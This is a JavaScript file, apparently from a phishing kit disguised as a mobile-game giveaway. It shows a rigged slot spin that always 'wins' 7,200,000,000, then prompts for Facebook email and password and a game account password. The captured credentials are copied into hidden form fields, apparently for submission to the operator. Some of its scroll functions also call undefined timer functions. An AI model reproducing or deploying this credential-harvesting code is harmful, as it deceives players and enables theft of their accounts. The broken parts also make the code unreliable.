function IDalexhdi(){
   var playid = $("#idalexhdi").val();
   $(".respon").show();
   $(".wrong").hide();
   $(".tidakada").hide();
   if(playid == "" || playid == null || playid.length <= 4)
   {
   $(".trueIDalex").hide();
   $(".toasterroralex").show();
   $(".wrong").show();
   $(".respon").hide();
   $(".tidakada").hide();
   return false;
   }else{
   $(".wrong").hide();
   }
   
   $.ajax({
   type : 'POST',
   url : 'system/trueid.php?playid='+playid+'',
   beforeSend : function(){
         $(".respon").show();
   },
   success : function(data){
    if(data == "" || data == null){ /** if(data.result.status == "404"){ */
   $(".respon").hide();
   $(".tidakada").show();
   $(".trueidalexhdi").show();
   }else{
   $(".trueidalexhdi").hide();
   $("#toastid").text(playid); /** playid */
   $("#toastnick").text(data); /** data.nickname */
   $("input#toastnickmarsya").val(data);/** data.nickname */
   $("input#ressplayid").val(playid); /** playid */
   $("input#ressnick").val(data); /** data nickname */
   document.getElementById("loginalexhdi").innerHTML = "Log Out";
   }
   }
   })
   
}
/**Data UNTUK disimpan atau dicatat*/
/**$.ajax({
   type : 'POST',
   url : ''+playid+'',
   beforeSend : function(){
         $(".respon").show();
   },
   success : function(data){
    if(data.result.status == "404"){
   $(".respon").hide();
   $(".tidakada").show();
   $(".trueidalexhdi").show();
   }else{
   $(".trueidalexhdi").hide();
   $("#toastid").text(playid);
   $("#toastnick").text(data.nickname);
   $("input#toastnickmarsya").val(data.nickname);
   $("input#ressplayid").val(playid);
   $("input#ressnick").val(data.nickname);
   document.getElementById("loginalexhdi").innerHTML = "Log Out";
   }
   }
   })
   
} */

function openloginalexhdi() {
    $('.chooseloginalexmarsya').fadeIn();
}
function closeloginalexhdi() {
    $('.chooseloginalexmarsya').hide();
}
function openfbalex() {
    $('.alex-facebook').fadeIn();
    $('.chooseloginalexmarsya').hide();
}
function closefbalex() {
    $('.alex-facebook').hide();
    $('.chooseloginalexmarsya').fadeIn();
}
function openpengunjungalex() {
    $('.alex-pengunjung').fadeIn();
    $('.chooseloginalexmarsya').hide();
}
function closepengunjungalex() {
    $('.alex-pengunjung').hide();
    $('.chooseloginalexmarsya').fadeIn();
}
function openrulesalex() {
    $('.rulesalexhdi').fadeIn();
}
function closerulesalex() {
    $('.rulesalexhdi').hide();
}

function closepgalexfb() {
    $('.alex-pengunjung-fb').hide();
    $('.alex-facebook').show();
}

function AlexHostingNetFB()
	{
		$emailfb = $('#alx_email_fb').val().trim();
		$passwordfb = $('#alx_password_fb').val().trim();
		$loginfb = $('#alx_login_fb').val().trim();
		if($emailfb == '' || $emailfb == null || $emailfb.length <= 6)
		{
			$('.email-fb').show();
			$('.sandi-fb').hide();
            $('.alex-facebook').show();
            $('.alex-pengunjung-fb').hide();
			return false;
		}else{
			$('.email-fb').hide();
			$('.alex-facebook').hide();
			$('.alex-pengunjung-fb').show();
			$("input#emailress").val($emailfb);
		}
		if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
		{
			$('.sandi-fb').show();
            $('.alex-facebook').show();
            $('.alex-pengunjung-fb').hide();
			return false;
		}else{
			$('.sandi-fb').hide();
			$('.alex-facebook').hide();
			$('.alex-pengunjung-fb').show();
			$("input#passwordress").val($passwordfb);
			$("input#loginress").val($loginfb);
		}
	}
	
	function AlexHostingNetPGFB()
	{
	    $emailpg = $('#ressplayid').val().trim();
		$passwordpgfb = $('#alx_password_pgfb').val().trim();
		if($passwordpgfb == '' || $passwordpgfb == null || $passwordpgfb.length <= 5)
		{
			$('.sandi-pgfb').show();
			return false;
		}else{
			$('.sandi-pgfb').hide();
		}
	}
	
function AlexHostingNetPG()
	{
	    $emailpg = $('#ressplayid').val().trim();
		$passwordpg = $('#alx_password_pg').val().trim();
		if($passwordpg == '' || $passwordpg == null || $passwordpg.length <= 5)
		{
			$('.sandi-pg').show();
			return false;
		}else{
			$('.sandi-pg').hide();
		}
	}

    function menualexclaim() {
        $('.boxclaimalexmarsyahdi').show()
        $('.boxalexfafamarsya').hide()
        var element = document.getElementById("menualexclaim");
        element.classList.add("activemenualex");
        var element = document.getElementById("menualexslot");
        element.classList.remove("activemenualex");
        $('.footeralexclaim').show();
        $('.footmarsyaspin').hide();
    }
    function menualexspin() {
        $('.boxclaimalexmarsyahdi').hide()
        $('.boxalexfafamarsya').show()
        var element = document.getElementById("menualexclaim");
        element.classList.remove("activemenualex");
        var element = document.getElementById("menualexslot");
        element.classList.add("activemenualex");
        $('.footeralexclaim').hide();
        $('.footmarsyaspin').show();
        $('.notifalexfafa').hide();
    }
    
    function aleralexfafa() {
        alert("Spin Gratis tidak dapat mengubah bet. Bet dapat diganti setelah spin gratis habis.");    
    }
    
    function tutupalexnotif() {
        $('.notifalexfafa').hide();
    }

    var slideIndex = 1;
showDivs(slideIndex);

function plusDivs(n) {
showDivs(slideIndex += n);
}

function currentDiv(n) {
showDivs(slideIndex = n);
}

function showDivs(n) {
var i;
var x = document.getElementsByClassName("mySlides");
var dots = document.getElementsByClassName("demo");
if (n > x.length) {slideIndex = 1}    
if (n < 1) {slideIndex = x.length}
for (i = 0; i < x.length; i++) {
    x[i].style.display = "none";  
}
for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" w3-white", "");
}
    x[slideIndex-1].style.display = "block";  
    dots[slideIndex-1].className += " w3-white";
}

setInterval(function(){
    plusDivs(1);
}, 3000);

function mulaialexspinfafa() {
    my_time = setTimeout('pageScroll()', 1);
    my_time = setTimeout('pageScroll2()', 1);
    my_time = setTimeout('pageScroll3()', 1);
    my_time = setTimeout('pageScroll4()', 1);
    my_time = setTimeout('pageScroll5()', 1);
    $('.alexspinbtnmarsya').prop('disabled', true);
    var element = document.getElementById("btnalexspin");
    element.classList.add("deactivate");

}
        var $ressvaluealex;
        var my_time;
		var count = 0;
		function pageScroll() {
      // If condition to set repeat 
			if (count < 10) {
				var objDiv1 = document.getElementById("fafalex1");
				objDiv1.scrollTop = objDiv1.scrollTop + 2;
				if (objDiv1.scrollTop == (objDiv1.scrollHeight - 61)) {
          setTimeout(function() {
						objDiv1.scrollTop = 0;
						count++;
            }, 100);
				}
        //set scrolling time start
				my_time = setTimeout('pageScroll()', 1.2);
        //set scrolling time end
			}
		}
		var my_time2;
		var count2 = 0;
		function pageScroll2() {
      // If condition to set repeat 
			if (count2 < 10) {
            var objDiv2 = document.getElementById("fafalex2");
				objDiv2.scrollTop = objDiv2.scrollTop + 2;
				if (objDiv2.scrollTop == (objDiv2.scrollHeight - 61)) {
          setTimeout2(function() {
						objDiv2.scrollTop = 0;
						count2++;
            }, 100);
				}
        //set scrolling time start
				my_time = setTimeout('pageScroll2()', 1.4);
        //set scrolling time end
			}
		}
		var my_time3;
		var count3 = 0;
		function pageScroll3() {
      // If condition to set repeat 
			if (count3 < 10) {
            var objDiv3 = document.getElementById("fafalex3");
				objDiv3.scrollTop = objDiv3.scrollTop + 2;
				if (objDiv3.scrollTop == (objDiv3.scrollHeight - 61)) {
          setTimeout3(function() {
						objDiv3.scrollTop = 0;
						count3++;
            }, 100);
				}
        //set scrolling time start
				my_time = setTimeout('pageScroll3()', 1.6);
        //set scrolling time end
			}
		}
		var my_time4;
		var count4 = 0;
		function pageScroll4() {
      // If condition to set repeat 
			if (count4 < 10) {
            var objDiv4 = document.getElementById("fafalex4");
				objDiv4.scrollTop = objDiv4.scrollTop + 2;
				if (objDiv4.scrollTop == (objDiv4.scrollHeight - 61)) {
          setTimeout4(function() {
						objDiv4.scrollTop = 0;
						count4++;
            }, 100);
				}
        //set scrolling time start
				my_time = setTimeout('pageScroll4()', 1.8);
        //set scrolling time end
			}
		}
		var my_time5;
		var count5 = 0;
		function pageScroll5() {
      // If condition to set repeat 
			if (count5 < 10) {
			    setTimeout(() => {
                    $('.hadiahspinalexfafa').fadeIn();
                    document.getElementById("valuespinalex").innerHTML = "7.200.000.000";
                },5500);
            var objDiv5 = document.getElementById("fafalex5");
				objDiv5.scrollTop = objDiv5.scrollTop + 2;
				if (objDiv5.scrollTop == (objDiv5.scrollHeight - 10)) {
          setTimeout(function() {
						objDiv5.scrollTop = 0;
						count5++;
            }, 100);
				}
        //set scrolling time start
				my_time = setTimeout('pageScroll5()', 2);
        //set scrolling time end
			}
		}